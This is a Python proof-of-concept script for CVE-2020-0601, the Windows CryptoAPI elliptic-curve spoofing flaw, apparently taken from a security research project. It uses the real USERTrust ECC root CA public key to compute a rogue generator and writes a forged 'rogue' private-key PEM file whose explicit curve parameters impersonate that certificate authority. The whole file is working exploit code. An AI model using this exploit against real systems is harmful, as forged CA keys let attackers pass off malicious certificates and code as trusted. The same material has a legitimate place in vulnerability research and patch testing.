# pylint: disable=line-too-long, unsupported-assignment-operation, unsubscriptable-object
"""
gen_key is a CVE-2020-0601 PoC written by the people at https://github.com/kudelskisecurity/chainoffools
"""

from binascii import unhexlify

import gmpy2

from Crypto.IO import PEM
from Crypto.Util.asn1 import DerSequence
from Crypto.Util.asn1 import DerBitString
from Crypto.Util.asn1 import DerOctetString

from fastecdsa.curve import P384
from fastecdsa.point import Point

# USERTrust ECC Certification Authority public key
PUBKEY = b"1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221b3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979"
Q = Point(int(PUBKEY[0:96], 16), int(PUBKEY[96:], 16), curve=P384)

# Generate rogue generator
PRIVKEY_INV = 2
# we take the private key as being the inverse of 2 modulo the curve order
PRIVKEY = gmpy2.invert(PRIVKEY_INV, P384.q) # pylint: disable=c-extension-no-member
PRIVKEY = unhexlify(f"{PRIVKEY:x}".encode())
# we multply our public key Q with the inverse of our chosen private key value
ROUG_G = PRIVKEY_INV * Q
ROUG_G = unhexlify(b"04" + f"{ROUG_G.x:x}".encode() + f"{ROUG_G.y:x}".encode())

# Generate the file with explicit parameters
with open("p384-key.pem", mode="rt") as handle:
    KEYFILE = PEM.decode(handle.read())
# print(hexlify(KEYFILE[0]))

SEQ_DER = DerSequence()
DER = SEQ_DER.decode(KEYFILE[0])

# Replace private key
OCTET_DER = DerOctetString(PRIVKEY)
DER[1] = OCTET_DER.encode()

# Replace public key
# print(hexlify(der[3]))
BITS_DIR = DerBitString(unhexlify(b"04" + PUBKEY))
DER[3] = b"\xa1\x64" + BITS_DIR.encode()
# print(hexlify(der[3]))

# Replace the generator
# print(hexlify(der[2]))
SEQ_DER = DerSequence()
S = SEQ_DER.decode(DER[2][4:])
OCTET_DER = DerOctetString(ROUG_G)
S[3] = OCTET_DER.encode()
DER[2] = DER[2][:4] + S.encode()
# print(hexlify(der[2]))

# Generate new file
with open("p384-key-rogue.pem", mode="w") as handle:
    # print(hexlify(der.encode()))
    KEYFILE = PEM.encode(DER.encode(), "EC PRIVATE KEY")
    handle.write(KEYFILE)
